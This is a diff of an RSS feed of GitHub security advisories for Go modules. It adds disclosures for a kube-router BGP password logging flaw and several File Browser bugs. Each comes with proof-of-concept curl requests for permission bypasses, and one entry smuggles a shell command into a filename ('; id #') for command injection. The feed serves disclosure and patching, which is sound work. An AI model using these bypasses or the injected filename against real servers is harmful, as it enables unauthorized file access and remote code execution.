@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-04-07T23:09:57.453Z</updated>
+    <updated>2026-04-08T00:13:26.522Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,562 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cloudnativelabs/kube-router/v2] kube-router: BGP Peer Passwords Exposed in Logs at Verbose Logging Level]]></title>
+        <id>https://github.com/advisories/GHSA-fcmh-qfxc-w685</id>
+        <link href="https://github.com/advisories/GHSA-fcmh-qfxc-w685"/>
+        <updated>2026-04-08T00:07:55.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>When kube-router is configured with per-node BGP peer passwords using the <code>kube-router.io/peer.passwords</code> node annotation, and verbose logging is enabled (<code>--v=2</code> or higher), the raw Kubernetes node annotation map is logged verbatim — including the base64-encoded BGP MD5 passwords. Anyone with access to kube-router's logs (via <code>kubectl logs</code>, log aggregation systems, or shared log dumps during debugging) can extract and decode the BGP peer passwords. The official troubleshooting documentation instructs users to collect logs at <code>-v=2</code> before filing issues, making accidental disclosure during support interactions a realistic scenario.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerability is at <code>pkg/controllers/routing/network_routes_controller.go:1129</code>:</p>
+<pre><code class="language-go">// pkg/controllers/routing/network_routes_controller.go:1127-1133
+// If the global routing peer is configured then peer with it
+// else attempt to get peers from node specific BGP annotations.
+if len(nrc.globalPeerRouters) == 0 {
+    klog.V(2).Infof("Attempting to construct peer configs from annotation: %+v", node.Annotations)
+    peerCfgs, err := bgpPeerConfigsFromAnnotations(
+</code></pre>
+<p><code>node.Annotations</code> is of type <code>map[string]string</code>. This type does not implement <code>fmt.Stringer</code>, so <code>%+v</code> formatting dumps every key-value pair verbatim. When <code>kube-router.io/peer.passwords</code> is set on the node (the documented mechanism for providing per-node BGP MD5 passwords), its base64-encoded value appears in the log output.</p>
+<p>The BGP peer password annotation is documented in <code>docs/user-guide.md</code> and has the constant:</p>
+<pre><code class="language-go">// pkg/controllers/routing/network_routes_controller.go:59
+peerPasswordAnnotation = "kube-router.io/peer.passwords"
+</code></pre>
+<p>Note that a password-safe <code>String()</code> method exists on <code>PeerConfig</code> and <code>PeerConfigs</code> in <code>pkg/bgp/peer_config.go</code> and is tested:</p>
+<pre><code class="language-go">// pkg/bgp/peer_config.go:63-79
+// Custom Stringer to prevent leaking passwords when printed
+func (p PeerConfig) String() string {
+    // ...password field is intentionally omitted...
+}
+</code></pre>
+<p>However, this protective method is never invoked by the vulnerable log statement, which dumps the raw annotation map before any parsing occurs. The password masking only applies after the annotation is parsed into <code>PeerConfig</code> structs.</p>
+<p>The second log statement at line 1510 (<code>klog.Infof("Peer config from %s annotation: %+v", peersAnnotation, peerConfigs)</code>) is <strong>not vulnerable</strong> — <code>peerConfigs</code> is of type <code>bgp.PeerConfigs</code> which implements <code>fmt.Stringer</code> and correctly masks passwords.</p>
+<p>The vulnerable path (<code>bgpPeerConfigsFromIndividualAnnotations</code>) is triggered when the <code>kube-router.io/peers</code> consolidated YAML annotation is not set — i.e., when operators use the older individual annotation format (<code>kube-router.io/peer.ips</code>, <code>kube-router.io/peer.asns</code>, <code>kube-router.io/peer.passwords</code>). This older format remains fully supported and documented.</p>
+<h2 id="poc">PoC</h2>
+<p><strong>Setup</strong>: Node has per-node BGP peer annotations including a password:</p>
+<pre><code class="language-bash">kubectl annotate node worker-1 \
+  kube-router.io/peer.ips=192.0.2.1 \
+  kube-router.io/peer.asns=65001 \
+  "kube-router.io/peer.passwords=$(echo -n 's3cr3t-bgp-p@ss' | base64)"
+</code></pre>
+<p><strong>Trigger</strong>: Start kube-router with verbose logging (e.g., following troubleshooting documentation):</p>
+<pre><code class="language-bash"># As documented in docs/troubleshoot.md for debugging:
+kube-router ... --v=2
+</code></pre>
+<p><strong>Observe</strong>: In kube-router pod logs:</p>
+<pre><code>I0318 10:23:41.123456 1 network_routes_controller.go:1129] Attempting to construct peer configs from annotation:
+map[
+  kube-router.io/peer.asns:65001
+  kube-router.io/peer.ips:192.0.2.1
+  kube-router.io/peer.passwords:czNjcjN0LWJncC1wQHNz   &lt;-- base64-encoded password
+  ...other annotations...
+]
+</code></pre>
+<p><strong>Decode the password</strong>:</p>
+<pre><code class="language-bash">echo "czNjcjN0LWJncC1wQHNz" | base64 -d
+# Output: s3cr3t-bgp-p@ss
+</code></pre>
+<p><strong>Impact</strong>: With the decoded password and network adjacency to the BGP peer, an attacker can establish an unauthorized BGP session, inject routes, or disrupt legitimate BGP peering.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>BGP credential disclosure</strong>: BGP MD5 authentication passwords are exposed to anyone with access to kube-router log output</li>
+<li><strong>BGP session hijacking</strong>: An attacker who obtains the password and has network-level access to a BGP neighbor can impersonate the kube-router node, injecting malicious routes into the BGP table</li>
+<li><strong>Log forwarding risk</strong>: Log aggregation systems (Fluentd, Loki, Elastic, Splunk) typically have different and often broader access controls than Kubernetes RBAC. Passwords aggregated into these systems may be accessible to personnel without Kubernetes node access</li>
+<li><strong>Support workflow exposure</strong>: The official troubleshooting documentation recommends collecting <code>--v=2</code> logs before filing issues, creating a realistic path for passwords to be shared in bug reports or support tickets</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Remove or redact the vulnerable log statement at line 1129. The diagnostic information it provides (confirming that annotation-based peer configuration is being used) can be conveyed without exposing credential values:</p>
+<pre><code class="language-go">// Before (vulnerable):
+klog.V(2).Infof("Attempting to construct peer configs from annotation: %+v", node.Annotations)
+
+// After (safe):
+klog.V(2).Infof("Attempting to construct peer configs from per-node annotations (kube-router.io/peer.ips, etc.)")
+</code></pre>
+<p>If full annotation content is needed for debugging (e.g., to show non-sensitive annotations), log a filtered version that explicitly excludes the password annotation:</p>
+<pre><code class="language-go">// Safe alternative that preserves non-sensitive diagnostic info:
+safeAnnotations := make(map[string]string)
+for k, v := range node.Annotations {
+    if k != peerPasswordAnnotation {
+        safeAnnotations[k] = v
+    }
+}
+klog.V(2).Infof("Attempting to construct peer configs from annotations: %+v", safeAnnotations)
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cloudnativelabs/kube-router/security/advisories/GHSA-fcmh-qfxc-w685">https://github.com/cloudnativelabs/kube-router/security/advisories/GHSA-fcmh-qfxc-w685</a></li>
+<li><a href="https://github.com/advisories/GHSA-fcmh-qfxc-w685">https://github.com/advisories/GHSA-fcmh-qfxc-w685</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fcmh-qfxc-w685</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-08T00:07:53.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser: Proxy auth auto-provisioned users inherit Execute permission and Commands]]></title>
+        <id>https://github.com/advisories/GHSA-7526-j432-6ppp</id>
+        <link href="https://github.com/advisories/GHSA-7526-j432-6ppp"/>
+        <updated>2026-04-08T00:05:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The fix in commit <code>b6a4fb1</code> ("self-registered users don't get execute perms") stripped <code>Execute</code> permission and <code>Commands</code> from users created via the signup handler. The same fix was not applied to the proxy auth handler. Users auto-created on first successful proxy-auth login are granted execution capabilities from global defaults, even though the signup path was explicitly changed to prevent execution rights from being inherited by automatically provisioned accounts.</p>
+<p>Confirmed on v2.62.2 (commit 860c19d).</p>
+<h2 id="root-cause">Root Cause</h2>
+<p><code>auth/proxy.go</code> <code>createUser()</code> applies defaults without restriction:</p>
+<pre><code>user := &amp;users.User{
+    Username:     username,
+    Password:     hashedRandomPassword,
+    LockPassword: true,
+}
+setting.Defaults.Apply(user)
+// No restriction on Execute, Commands, or Admin
+</code></pre>
+<p>Compare with <code>http/auth.go</code> signup handler (lines 170-178):</p>
+<pre><code>d.settings.Defaults.Apply(user)
+user.Perm.Admin = false
+// Self-registered users should not inherit execution capabilities
+// from default settings, regardless of what the administrator has
+// configured as the default.
+user.Perm.Execute = false
+user.Commands = []string{}
+</code></pre>
+<p>The commit message for <code>b6a4fb1</code> states: "Execution rights must be explicitly granted by an admin." Users auto-created via proxy auth are also automatically provisioned (created on first login without explicit admin action), and the admin has not explicitly granted them execution rights.</p>
+<h2 id="poc">PoC</h2>
+<p>Tested on filebrowser v2.62.2, built from HEAD.</p>
+<pre><code># Configure with proxy auth, default commands, and exec
+filebrowser config set --auth.method=proxy --auth.header=X-Remote-User \
+  --commands "git,ls,cat,id"
+
+# Login as admin and verify defaults have execute=true, commands set
+ADMIN_TOKEN=$(curl -s http://HOST/api/login -H "X-Remote-User: admin")
+
+# Auto-create new user via proxy header
+PROXY_TOKEN=$(curl -s http://HOST/api/login -H "X-Remote-User: newproxyuser")
+
+# Check permissions
+curl -s http://HOST/api/users -H "X-Auth: $ADMIN_TOKEN" | jq '.[] | select(.username=="newproxyuser") | {execute: .perm.execute, commands}'
+</code></pre>
+<p>Result:</p>
+<pre><code>{
+  "execute": true,
+  "commands": ["git", "ls", "cat", "id"]
+}
+</code></pre>
+<p>The auto-created proxy user inherited Execute and the full Commands list. A user created via signup would have <code>execute: false</code> and <code>commands: []</code>.</p>
+<h2 id="impact">Impact</h2>
+<p>In proxy-auth deployments where the admin has configured default commands, users auto-provisioned on first proxy login receive execution capabilities that were not explicitly granted. The project established a security invariant in commit <code>b6a4fb1</code>: automatically provisioned accounts must not inherit execution rights from defaults. The proxy auto-provisioning path violates that invariant.</p>
+<p>This is an incomplete fix for GHSA-x8jc-jvqm-pm3f ("Signup Grants Execution Permissions When Default Permissions Includes Execution"), which addressed the signup handler but not the proxy auth handler.</p>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>Proxy auth enabled (<code>--auth.method=proxy</code>)</li>
+<li>Exec not disabled</li>
+<li>Default settings include non-empty Commands (admin-configured)</li>
+</ul>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Apply the same restrictions as the signup handler:</p>
+<pre><code>setting.Defaults.Apply(user)
+user.Perm.Admin = false
+user.Perm.Execute = false
+user.Commands = []string{}
+</code></pre>
+<hr>
+<p><strong>Update:</strong> Fix submitted as PR #5890.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-7526-j432-6ppp">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-7526-j432-6ppp</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35607">https://nvd.nist.gov/vuln/detail/CVE-2026-35607</a></li>
+<li><a href="https://github.com/filebrowser/filebrowser/pull/5890">https://github.com/filebrowser/filebrowser/pull/5890</a></li>
+<li><a href="https://github.com/advisories/GHSA-7526-j432-6ppp">https://github.com/advisories/GHSA-7526-j432-6ppp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7526-j432-6ppp</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-08T00:05:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser discloses text file content via /api/resources endpoint bypassing Perm.Download check]]></title>
+        <id>https://github.com/advisories/GHSA-67cg-cpj7-qgc9</id>
+        <link href="https://github.com/advisories/GHSA-67cg-cpj7-qgc9"/>
+        <updated>2026-04-08T00:05:09.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>resourceGetHandler</code> in <code>http/resource.go</code> returns full text file content without checking the <code>Perm.Download</code> permission flag. All three other content-serving endpoints (<code>/api/raw</code>, <code>/api/preview</code>, <code>/api/subtitle</code>) correctly verify this permission before serving content. A user with <code>download: false</code> can read any text file within their scope through two bypass paths.</p>
+<p>Confirmed on v2.62.2 (commit 860c19d).</p>
+<h2 id="root-cause">Root Cause</h2>
+<p><code>http/resource.go</code> line 26-33 hardcodes <code>Content: true</code> in the FileOptions without checking download permission:</p>
+<pre><code>file, err := files.NewFileInfo(&amp;files.FileOptions{
+    ...
+    Content:    true,  // Always loads text content, no permission check
+})
+</code></pre>
+<p>Lines 44-63: the <code>X-Encoding: true</code> header path reads the entire file and returns raw bytes as <code>application/octet-stream</code>, also without any download check.</p>
+<p>Compare with the three protected endpoints:</p>
+<pre><code>// raw.go:83-85
+if !d.user.Perm.Download { return http.StatusAccepted, nil }
+
+// preview.go:38-40
+if !d.user.Perm.Download { return http.StatusAccepted, nil }
+
+// subtitle.go:13-15
+if !d.user.Perm.Download { return http.StatusAccepted, nil }
+</code></pre>
+<h2 id="poc">PoC</h2>
+<p>Tested on filebrowser v2.62.2, built from HEAD.</p>
+<pre><code># Create user with download=false via CLI
+filebrowser users add restricted testuser123456 --perm.download=false
+
+# Login
+TOKEN=$(curl -s http://HOST/api/login -d '{"username":"restricted","password":"testuser123456"}')
+
+# BLOCKED: /api/raw correctly enforces download permission
+curl -s -w "\nHTTP: %{http_code}" http://HOST/api/raw/secret.txt -H "X-Auth: $TOKEN"
+# → 202 Accepted (empty body)
+
+# BYPASS 1: /api/resources with X-Encoding returns raw file content
+curl -s http://HOST/api/resources/secret.txt -H "X-Auth: $TOKEN" -H "X-Encoding: true"
+# → 200 OK, body: SECRET_PASSWORD=hunter2
+
+# BYPASS 2: /api/resources JSON includes content field
+curl -s http://HOST/api/resources/secret.txt -H "X-Auth: $TOKEN" | jq .content
+# → "SECRET_PASSWORD=hunter2\n"
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>A user with <code>download: false</code> can read the full content of text files within their authorized scope (up to the 10MB <code>detectType</code> limit). This includes source code, configuration files, credentials, and API tokens stored as text.</p>
+<p>This bypass does not defeat path authorization. It bypasses only the <code>Download</code> permission for files the user can otherwise address within their authorized scope. The inconsistency across the four content-serving endpoints (three check <code>Perm.Download</code>, one does not) indicates this is an oversight, not a design decision.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Match the existing endpoint behavior (HTTP 202 for denied downloads):</p>
+<pre><code>Content: d.user.Perm.Download,  // Only load content when permitted
+</code></pre>
+<p>And add a guard before the X-Encoding raw byte path, matching the existing 202 pattern:</p>
+<pre><code>if !d.user.Perm.Download {
+    return http.StatusAccepted, nil
+}
+</code></pre>
+<hr>
+<p><strong>Update:</strong> Fix submitted as PR #5891.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-67cg-cpj7-qgc9">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-67cg-cpj7-qgc9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35606">https://nvd.nist.gov/vuln/detail/CVE-2026-35606</a></li>
+<li><a href="https://github.com/advisories/GHSA-67cg-cpj7-qgc9">https://github.com/advisories/GHSA-67cg-cpj7-qgc9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-67cg-cpj7-qgc9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-08T00:05:09.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser share links remain accessible after Share/Download permissions are revoked]]></title>
+        <id>https://github.com/advisories/GHSA-v9w4-gm2x-6rvf</id>
+        <link href="https://github.com/advisories/GHSA-v9w4-gm2x-6rvf"/>
+        <updated>2026-04-08T00:04:59.000Z</updated>
+        <content type="html"><![CDATA[<p>When an admin revokes a user's Share and Download permissions, existing share links created by that user remain fully accessible to unauthenticated users. The public share download handler does not re-check the share owner's current permissions. Verified with a running PoC against v2.62.2 (commit 860c19d).</p>
+<h2 id="details">Details</h2>
+<p>Share creation (<code>http/share.go:21-29</code>) correctly checks permissions:</p>
+<pre><code>func withPermShare(fn handleFunc) handleFunc {
+    return withUser(func(w http.ResponseWriter, r *http.Request, d *data) (int, error) {
+        if !d.user.Perm.Share || !d.user.Perm.Download {
+            return http.StatusForbidden, nil
+        }
+        return fn(w, r, d)
+    })
+}
+</code></pre>
+<p>But share access (<code>http/public.go:18-87</code>, <code>withHashFile</code>) does not:</p>
+<pre><code>var withHashFile = func(fn handleFunc) handleFunc {
+    return func(w http.ResponseWriter, r *http.Request, d *data) (int, error) {
+        link, err := d.store.Share.GetByHash(id)   // line 21: checks share exists
+        authenticateShareRequest(r, link)            // line 26: checks password
+        user, err := d.store.Users.Get(...)          // line 31: checks user exists
+        d.user = user                                // line 36: sets user
+        file, err := files.NewFileInfo(...)           // line 38: gets file
+        // MISSING: no check for d.user.Perm.Share or d.user.Perm.Download
+    }
+}
+</code></pre>
+<h2 id="proof-of-concept-runtime-verified">Proof of Concept (runtime-verified)</h2>
+<pre><code># Step 1: Login as admin
+TOKEN=$(curl -s -X POST http://localhost:18080/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"&lt;admin-password&gt;"}')
+
+# Step 2: Create testuser with Share+Download permissions
+curl -X POST http://localhost:18080/api/users \
+  -H "X-Auth: $TOKEN" -H "Content-Type: application/json" \
+  -d '{"what":"user","which":[],"current_password":"&lt;admin-password&gt;",
+       "data":{"username":"testuser","password":"TestPass123!","scope":".",
+       "perm":{"share":true,"download":true,"create":true}}}'
+
+# Step 3: Login as testuser and create share
+USER_TOKEN=$(curl -s -X POST http://localhost:18080/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testuser","password":"TestPass123!"}')
+curl -X POST http://localhost:18080/api/share/secret.txt \
+  -H "X-Auth: $USER_TOKEN" -H "Content-Type: application/json" -d '{}'
+# Returns: {"hash":"fB4Qwtsn","path":"/secret.txt","userID":2,"expire":0}
+
+# Step 4: Verify share works (unauthenticated)
+curl http://localhost:18080/api/public/dl/fB4Qwtsn
+# Returns: file content (200 OK)
+
+# Step 5: Admin revokes testuser's Share and Download permissions
+curl -X PUT http://localhost:18080/api/users/2 \
+  -H "X-Auth: $TOKEN" -H "Content-Type: application/json" \
+  -d '{"what":"user","which":["all"],"current_password":"&lt;admin-password&gt;",
+       "data":{"id":2,"username":"testuser","scope":".",
+       "perm":{"share":false,"download":false,"create":true}}}'
+
+# Step 6: Verify testuser CANNOT create new shares
+curl -X POST http://localhost:18080/api/share/secret.txt \
+  -H "X-Auth: $USER_TOKEN" -d '{}'
+# Returns: 403 Forbidden (correct)
+
+# Step 7: THE BUG - old share STILL works
+curl http://localhost:18080/api/public/dl/fB4Qwtsn
+# Returns: file content (200 OK) - SHOULD be 403
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>When an admin revokes a user's Share or Download permissions:</p>
+<ul>
+<li>New share creation is correctly blocked (403)</li>
+<li>But all existing shares created by that user remain fully accessible to unauthenticated users</li>
+<li>The admin has a false sense of security: they believe revoking Share permission stops all sharing</li>
+</ul>
+<p>This is the same vulnerability class as GHSA-68j5-4m99-w9w9 ("Authorization Policy Bypass in Public Share Download Flow").</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Add permission re-validation in <code>withHashFile</code>:</p>
+<pre><code>user, err := d.store.Users.Get(d.server.Root, link.UserID)
+if err != nil {
+    return errToStatus(err), err
+}
+
+// Verify the share owner still has Share and Download permissions
+if !user.Perm.Share || !user.Perm.Download {
+    return http.StatusForbidden, nil
+}
+
+d.user = user
+</code></pre>
+<hr>
+<p><strong>Update:</strong> Fix submitted as PR #5888.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-v9w4-gm2x-6rvf">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-v9w4-gm2x-6rvf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35604">https://nvd.nist.gov/vuln/detail/CVE-2026-35604</a></li>
+<li><a href="https://github.com/filebrowser/filebrowser/pull/5888">https://github.com/filebrowser/filebrowser/pull/5888</a></li>
+<li><a href="https://github.com/advisories/GHSA-v9w4-gm2x-6rvf">https://github.com/advisories/GHSA-v9w4-gm2x-6rvf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v9w4-gm2x-6rvf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-08T00:04:59.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser has an access rule bypass via HasPrefix without trailing separator in path matching]]></title>
+        <id>https://github.com/advisories/GHSA-5q48-q4fm-g3m6</id>
+        <link href="https://github.com/advisories/GHSA-5q48-q4fm-g3m6"/>
+        <updated>2026-04-08T00:04:50.000Z</updated>
+        <content type="html"><![CDATA[<p>Hi,</p>
+<p>The <code>Matches()</code> function in <code>rules/rules.go</code> uses <code>strings.HasPrefix()</code> without a trailing directory separator when matching paths against access rules. A rule for <code>/uploads</code> also matches <code>/uploads_backup/</code>, granting or denying access to unintended directories. Verified against v2.62.2 (commit 860c19d).</p>
+<h2 id="details">Details</h2>
+<p>At <code>rules/rules.go:29-35</code>:</p>
+<pre><code>func (r *Rule) Matches(path string) bool {
+    if r.Regex {
+        return r.Regexp.MatchString(path)
+    }
+    return strings.HasPrefix(path, r.Path)
+}
+</code></pre>
+<p>When a rule has <code>Path: "/uploads"</code>, any path starting with <code>/uploads</code> matches, including <code>/uploads_backup/secret.txt</code>. The regex variant at line 31 uses proper matching, but the non-regex path uses a prefix check without ensuring the match ends at a directory boundary.</p>
+<p>The <code>Check()</code> function at <code>http/data.go:29-48</code> iterates all rules with last-match-wins semantics. No secondary validation exists beyond this prefix check.</p>
+<h2 id="poc">PoC</h2>
+<p>Admin configures: allow rule <code>Path: "/shared"</code> for a restricted user.</p>
+<p>Filesystem contains:</p>
+<ul>
+<li><code>/shared/</code> (intended to be accessible)</li>
+<li><code>/shared_private/</code> (intended to be restricted)</li>
+</ul>
+<p>User requests <code>/shared_private/secret.txt</code>:</p>
+<ul>
+<li><code>strings.HasPrefix("/shared_private/secret.txt", "/shared")</code> returns true</li>
+<li>Allow rule applies</li>
+<li>Access granted to the unintended directory</li>
+</ul>
+<h2 id="impact">Impact</h2>
+<p>Authenticated users can access files in sibling directories that share a common prefix with an allowed directory, bypassing the admin's intended access configuration.</p>
+<h2 id="prior-art">Prior art</h2>
+<p>Prior advisories GHSA-4mh3-h929-w968 (path-based access control bypass) and GHSA-9f3r-2vgw-m8xp (path traversal in copy/rename) addressed related access control issues. This HasPrefix prefix-collision is a distinct, unreported variant.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<pre><code>func (r *Rule) Matches(path string) bool {
+    if r.Regex {
+        return r.Regexp.MatchString(path)
+    }
+    prefix := r.Path
+    if prefix != "/" &amp;&amp; !strings.HasSuffix(prefix, "/") {
+        prefix += "/"
+    }
+    return path == r.Path || strings.HasPrefix(path, prefix)
+}
+</code></pre>
+<p>Koda Reef</p>
+<hr>
+<p><strong>Update:</strong> Fix submitted as PR #5889.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-5q48-q4fm-g3m6">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-5q48-q4fm-g3m6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35605">https://nvd.nist.gov/vuln/detail/CVE-2026-35605</a></li>
+<li><a href="https://github.com/filebrowser/filebrowser/pull/5889">https://github.com/filebrowser/filebrowser/pull/5889</a></li>
+<li><a href="https://github.com/advisories/GHSA-5q48-q4fm-g3m6">https://github.com/advisories/GHSA-5q48-q4fm-g3m6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5q48-q4fm-g3m6</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-08T00:04:49.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser has a Command Injection via Hook Runner]]></title>
+        <id>https://github.com/advisories/GHSA-jvpw-637p-h3pw</id>
+        <link href="https://github.com/advisories/GHSA-jvpw-637p-h3pw"/>
+        <updated>2026-04-08T00:04:27.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>[!NOTE]
+<strong>This feature has been disabled by default for all installations from v2.33.8 onwards, including for existent installations</strong>. To exploit this vulnerability, the instance administrator must turn on a feature and ignore all the warnings about known vulnerabilities. We're publishing this new advisory to make it clear that it also applies to Hook Runners and not just to the Shell Commands, since all advisories until now focused only on the shell command execution.</p>
+<p>For more information about tracking vulnerability issues related to the Command Execution features, check <a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a>.</p>
+</blockquote>
+<h2 id="overview">Overview</h2>
+<p>The hook system in File Browser — which executes administrator-defined shell commands on file events such as upload, rename, and delete — is vulnerable to OS command injection. Variable substitution for values like <code>$FILE</code> and <code>$USERNAME</code> is performed via <code>os.Expand</code> without sanitization. An attacker with file write permission can craft a malicious filename containing shell metacharacters, causing the server to execute arbitrary OS commands when the hook fires. This results in <strong>Remote Code Execution (RCE)</strong>.</p>
+<h2 id="affected-location">Affected Location</h2>
+<ul>
+<li><strong>File:</strong> <code>runner/runner.go</code></li>
+<li><strong>Function:</strong> <code>Runner.exec</code></li>
+</ul>
+<h2 id="technical-details">Technical Details</h2>
+<p><code>Runner.exec</code> expands template variables inside hook command strings using <code>os.Expand</code>:</p>
+<pre><code class="language-go">// runner/runner.go
+envMapping := func(key string) string {
+    switch key {
+    case "FILE":
+        return path       // attacker-controlled filename
+    case "USERNAME":
+        return username   // attacker-controlled username
+    // ...
+    }
+}
+
+for i, arg := range command {
+    if i == 0 { continue }
+    command[i] = os.Expand(arg, envMapping) // expands $FILE, $USERNAME, etc.
+}
+</code></pre>
+<p>The expanded value is then passed as a shell argument string. <code>os.Expand</code> performs plain string substitution with no escaping. If an admin has configured a hook such as:</p>
+<pre><code>sh -c "echo created $FILE"
+</code></pre>
+<p>...and an attacker creates a file named <code>; id #</code>, the variable expansion produces:</p>
+<pre><code>sh -c "echo created /path/to/; id #"
+</code></pre>
+<p>The <code>;</code> terminates the <code>echo</code> command and the shell executes <code>id</code> with server privileges. The <code>#</code> character comments out the remainder, preventing syntax errors.</p>
+<p>This pattern is exploitable across all hook events: <code>before_upload</code>, <code>after_upload</code>, <code>before_rename</code>, <code>after_rename</code>, <code>before_delete</code>, <code>after_delete</code>, etc.</p>
+<h2 id="attack-scenario--reproduction-steps">Attack Scenario / Reproduction Steps</h2>
+<ol>
+<li>Admin configures an <code>after_upload</code> hook: <code>sh -c "echo created $FILE"</code>.</li>
+<li>The attacker (authenticated user with upload permission) uploads a file named <code>; id #</code>.</li>
+<li>The upload succeeds and the hook fires automatically.</li>
+<li>The server executes:<pre><code class="language-sh">sh -c "echo created /uploads/; id #"
+</code></pre>
+</li>
+<li>The <code>id</code> command runs, confirming RCE.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p>Any authenticated user with file create, upload, or rename permissions can achieve arbitrary RCE on the server when shell-based hooks are configured. The attacker does not need to know the exact hook command — any hook that embeds <code>$FILE</code> in a shell string is exploitable by crafting the filename accordingly.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<pre><code class="language-go">package runner
+
+import (
+        "os"
+        "testing"
+
+        "github.com/filebrowser/filebrowser/v2/settings"
+)
+
+func TestPoC_FileHookInjection(t *testing.T) {
+        // Simulate an admin-configured shell-based hook
+        r := &amp;Runner{
+                Enabled: true,
+                Settings: &amp;settings.Settings{
+                        Shell: []string{"sh", "-c"},
+                        Commands: map[string][]string{
+                                "after_upload": {"echo Uploaded $FILE"},
+                        },
+                },
+        }
+
+        // Malicious filename crafted by the attacker
+        maliciousFilename := "/tmp/safe; id #"
+
+        // Simulate the exec logic in runner/runner.go
+        raw := r.Commands["after_upload"][0]
+        command, _, _ := ParseCommand(r.Settings, raw)
+
+        envMapping := func(key string) string {
+                if key == "FILE" {
+                        return maliciousFilename
+                }
+                return os.Getenv(key)
+        }
+
+        for i, arg := range command {
+                if i == 0 {
+                        continue
+                }
+                // os.Expand substitutes $FILE with the attacker-controlled filename —
+                // no escaping is applied, so shell metacharacters pass through unchanged.
+                command[i] = os.Expand(arg, envMapping)
+        }
+
+        // The resulting command argument is the injected shell script:
+        // sh -c "echo Uploaded /tmp/safe; id #"
+        expectedArg := "echo Uploaded /tmp/safe; id #"
+        if command[2] != expectedArg {
+                t.Errorf("Expected command argument %q, got %q", expectedArg, command[2])
+        }
+
+        t.Logf("Confirmed: filename injection succeeded. Shell will execute: %v", command)
+}
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jvpw-637p-h3pw">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-jvpw-637p-h3pw</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35585">https://nvd.nist.gov/vuln/detail/CVE-2026-35585</a></li>
